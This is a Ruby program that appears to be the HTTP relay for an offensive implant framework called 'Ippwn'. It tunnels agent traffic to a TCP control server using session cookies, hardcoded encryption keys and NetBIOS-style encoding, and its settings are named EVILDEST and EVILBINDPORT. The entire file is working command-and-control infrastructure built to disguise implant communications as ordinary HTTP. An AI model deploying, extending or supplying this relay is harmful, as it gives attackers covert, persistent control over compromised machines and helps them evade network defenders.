#!/usr/bin/env ruby

#
# An HTTP shim for supporting Ippwn connections over HTTP.  This program
# simply relays bytes in and out to the TCP stream server.  It supports
# multiple sessions, and utilizes HTTP in the following manner:
#
#  (1) Sessions are identified by the 'session' cookie, a random UUID
#  (2) A 200 response means server has no more queued data for agent
#  (3) A 202 response means server has more data in queue
#  (4) Data is encoded with NetBIOS's half-ASCII biased encoding
#
# It's up to the agent how often it wants to communicate and how it
# handles server responses vis a vis its connect timing.  The initial
# request will have no 'session' cookie, and it will be assigned.  It's
# the agent's responsibility to store and manage its cookie.
#
# Output is prettiest if you have the 'thin' HTTP server, since it
# doesn't spam the STDOUT with logs.
#

$root = File.expand_path(File.dirname(__FILE__))

$LOAD_PATH << "#{$root}/"

require 'optparse'
require 'date'
require 'sinatra'
require 'sinatra/cookies'
require 'thread'
require 'socket'
require 'securerandom'
require 'crypto.rb'

disable :logging

$sessions = {}
$inkey = "\xf1\x77\x80\x02\xea\x2a\x5f\x72\xd2\x0b\x28\x1e\x38\xa9\xc9\x4b"
$outkey = "\x1c\xab\x2b\x1d\xa7\xf8\xd7\x98\x4a\x28\x8b\x54\x58\x71\xb0\x52"

#
# Each Session has a queue for data from server to agent, and a TCP
# socket for comms with the standard server.  
#

class Session
  attr_accessor :sock, :handler, :queue, :mutx, :uuid, :incrypto, :outcrypto

  @@levels = {
    :in => 32,
    :out => 35,
    :note => 36,
    :err => 31
  }

  def initialize(host, port, uuid)
    @socket    = TCPSocket.new(host, port)
    @queue     = Queue.new
    @mutx      = Mutex.new
    @uuid      = uuid
    @handler   = Thread.new { handler() }
    @incrypto  = Ippwn::Crypto::SpritzC.new()
    @outcrypto = Ippwn::Crypto::SpritzC.new()

    @incrypto.key_setup($inkey)
    @outcrypto.key_setup($outkey)
  end

  def log(level, msg)
    msg.gsub!("", "\x1b[1m")
    msg.gsub!("", "\x1b[22m")

    STDERR.puts("#{DateTime.now().to_s()} \x1b[#{@@levels[level]}m#{msg}\x1b[0m")
  end
  
  def handler()
    begin
      while data = @socket.recv(1)
        break if data == ""
        @mutx.synchronize { @queue << data }
      end
    rescue Exception => e
      log(:err, "Session #{@uuid} failed: #{e.message}")
    end
    log(:err, "Session #{@uuid} exited")
  end

  def decode(pair)
    high = (pair[0].ord() - 0x41) << 4
    low  = (pair[1].ord() - 0x41)
    return high + low
  end

  def encode(byte)
    high = (byte & 0xf0) >> 4
    low  = (byte & 0x0f)
    return [high + 0x41, low + 0x41].pack("C*")
  end

  def from_habe(data)
    pairs = data.scan(/(..)/).flatten()
    bytes = pairs.map { |i| decode(i) }
    return bytes.pack("C*")
  end

  def to_habe(data)
    return data.unpack("C*").map { |i| encode(i) }.join("")
  end

  def packet()
    data = ""
    while data.length < 2048 and @queue.length > 0
      @mutx.synchronize { data += @queue.pop() }
    end
    return data
  end

  def decrypt(data)
    return data.unpack("C*").map { |i| i ^ @outcrypto.drip() }.pack("C*")
  end

  def encrypt(data)
    return data.unpack("C*").map { |i| i ^ @incrypto.drip() }.pack("C*")
  end

  def deliver(data)
    @noted = false

    if data.length > 0
      data = from_habe(data)
      data = decrypt(data)

      log(:in, "session #{@uuid} received #{data.length} bytes")
      @noted = true
      begin
        @socket.send(data, 0)
      rescue Exception => e
        log(:err, "ERROR #{e.message}")
      end
    end
  end

  def code()
    code = 200

    @mutx.synchronize do
      code = 202 if @queue.length > 0
    end

    return code
  end

  def obtain()
    data = ""
    while data.length < 2048 and @queue.length > 0
      @mutx.synchronize { data += @queue.pop() }
    end

    if data.length > 0
      @noted = true
      log(:out, "session #{@uuid} sending #{data.length} bytes")
    end

    if not @noted
      log(:out, "session #{@uuid} ping")
    end

    data = encrypt(data)

    return to_habe(data)
  end
end

def packet()
  data = ""

  while data.length < 2048 and $queue.length > 0
    $mutx.synchronize { data += $queue.pop() }
  end

  return data
end

def get_env_option(options, field, name)
  if ENV.key? name
    puts("Overriding option #{field} -> #{ENV[name]}")
    options[field] = ENV[name]
  end
end

options = { :port => 1920, :bind => "0.0.0.0", :dest => "127.0.0.1", :dport => 1919 }

get_env_option(options, :port, "EVILBINDPORT")
get_env_option(options, :bind, "EVILBINDADDR")
get_env_option(options, :dest, "EVILDEST")
get_env_option(options, :dport, "EVILDPORT")

options[:port] = ENV["EVILBINDPORT"] if ENV.key? "EVILBINDPORT"
options[:bind] = ENV["EVILBINDADDR"] if ENV.key? "EVILBINDADDR"
options[:dest] = ENV["EVILDEST"] if ENV.key? "EVILDEST"
options[:dport] = ENV["EVILDPORT"] if ENV.key? "EVILDPORT"

set :bind, options[:bind]
set :port, options[:port].to_i

patch '/feed' do

  if cookies == {}
    # new session
    uuid = SecureRandom.uuid
    $sessions[uuid] = Session.new(options[:dest], options[:dport].to_i, uuid)
    cookies[:session] = uuid
  else
    # old session
    uuid = cookies[:session]
  end
    
  sess = $sessions[uuid]
  data = request.body.read.to_s
  sess.deliver(data)
  status sess.code()

  return sess.obtain()
end
